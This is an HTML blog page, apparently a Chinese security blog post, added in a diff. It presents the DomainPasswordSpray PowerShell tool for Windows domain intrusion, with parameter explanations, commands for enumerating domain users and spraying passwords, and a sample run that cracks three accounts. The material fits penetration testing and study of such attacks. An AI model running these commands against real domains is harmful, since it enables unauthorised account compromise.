@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Windows域渗透 - 用户密码枚举</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>推荐一个Powershell脚本</p>
+<ul>
+<li>目录
+{:toc}</li>
+</ul>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？</p>
+<h2 id="0x01-powershell">0x01 Powershell</h2>
+<p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽</p>
+<p>今天推荐一款名字叫<code>DomainPasswordSpray.ps1</code>的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x00.png" alt="0x00"></p>
+<p><strong>GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray</strong></p>
+<p>由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x01.png" alt="0x01"></p>
+<p><strong>优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</strong></p>
+<h2 id="0x02-参数说明">0x02 参数说明</h2>
+<p>在代码的开头就已经有介绍了，我简单汉化一下。</p>
+<p>描述：该模块主要用于从域中收集用户列表。</p>
+<ul>
+<li>参数： <code>Domain</code> 指定要测试的域名</li>
+<li>参数： <code>RemoveDisabled</code> 尝试从用户列表删除禁用的账户</li>
+<li>参数： <code>RemovePotentialLockouts</code> 删除锁定账户</li>
+<li>参数： <code>UserList</code> 自定义用户列表(字典)。 如果未指定，这将自动从域中获取</li>
+<li>参数： <code>Password</code> 指定单个密码进行口令测试</li>
+<li>参数： <code>PasswordList</code> 指定一个密码字典</li>
+<li>参数： <code>OutFile</code> 将结果保存到某个文件</li>
+<li>参数： <code>Force</code> 当枚举出第一个后继续枚举，不询问</li>
+</ul>
+<h2 id="0x03-使用说明">0x03 使用说明</h2>
+<p>使用例子：</p>
+<p><code>C:\PS&gt; Get-DomainUserList</code></p>
+<p>该命令将从域中收集用户列表。</p>
+<p><code>C:\PS&gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</code></p>
+<p>该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中</p>
+<p><code>C:\PS&gt; Invoke-DomainPasswordSpray -Password Winter2016</code></p>
+<p>该命令将会从域环境中获取用户名，然后逐个以密码<code>Winter2016</code>进行认证枚举</p>
+<p><code>C:\PS&gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt</code></p>
+<p>该命令将会从<code>users.txt</code>中提取用户名，与<code>passlist.txt</code>中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到<code>sprayed-creds.txt</code></p>
+<h2 id="0x04-实战">0x04 实战</h2>
+<h3 id="获取域环境中的用户列表">获取域环境中的用户列表</h3>
+<p><strong>命令：</strong><code>C:\PS&gt; Get-DomainUserList | Out-File -Encoding ascii userlist.txt</code></p>
+<p><strong>输出：</strong></p>
+<pre><code>[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] There are 8 total users found.
+[*] Created a userlist containing 8 users gathered from the current user's domain
+</code></pre><p>获取的用户名：</p>
+<pre><code>C:\PS&gt; type .\userlist.txt
+Administrator
+Guest
+liyingzhe
+krbtgt
+Hack
+testPass
+webManager
+dba
+</code></pre><h3 id="密码枚举">密码枚举</h3>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x02.png" alt="0x02"></p>
+<p><strong>命令：</strong> <code>C:\PS&gt; Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt</code></p>
+<p><strong>输出：</strong></p>
+<pre><code>[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] Removing disabled users from list.
+[*] There are 6 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 6 users gathered from the current user's domain
+[*] Password spraying has begun. Current time is 18:45
+[*] This might take a while depending on the total number of users
+1 of 6 users tested2 of 6 users tested3 of 6 users tested[*] SUCCESS! User:testPass Password:w!23456
+4 of 6 users tested[*] SUCCESS! User:webManager Password:w!23456
+5 of 6 users tested[*] SUCCESS! User:dba Password:w!23456
+6 of 6 users tested[*] Password spraying is complete
+[*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
+</code></pre><p>枚举的结果：</p>
+<pre><code>C:\PS &gt; type .\sprayed-creds.txt
+testPass:w!23456
+webManager:w!23456
+dba:w!23456
+</code></pre>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
